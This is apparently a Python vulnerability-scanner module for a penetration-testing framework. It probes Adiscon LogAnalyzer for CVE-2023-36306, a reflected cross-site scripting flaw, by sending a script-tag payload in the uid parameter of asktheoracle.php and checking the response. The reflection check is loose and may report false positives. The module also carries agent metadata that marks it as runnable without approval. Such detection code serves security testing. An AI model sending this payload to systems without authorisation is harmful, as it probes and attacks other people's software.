#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Cross Site Scripting (XSS) vulnerability in Adiscon Aiscon LogAnalyzer through 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adiscon LogAnalyzer v.4.1.13 - Cross-Site Scripting Detection',
        'description': 'A Cross Site Scripting (XSS) vulnerability in Adiscon Aiscon LogAnalyzer through 4.1.13 allows a remote attacker to execute arbitrary code via the asktheoracle.php',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'unauth', 'exploitdb', 'adiscon', 'adiscon-loganalyzer', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/51643', 'https://nvd.nist.gov/vuln/detail/CVE-2023-36306'],
        'cve': 'CVE-2023-36306',
    }

    def run(self):
        r = self.http_request(method="GET", path='/loganalyzer/asktheoracle.php?type=domain&query=&uid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', '><script>alert(document.domain)</script>', 'Adiscon LogAnalyzer',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Adiscon LogAnalyzer v.4.1.13 - Cross-Site Scripting detected",
                path='/loganalyzer/asktheoracle.php?type=domain&query=&uid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

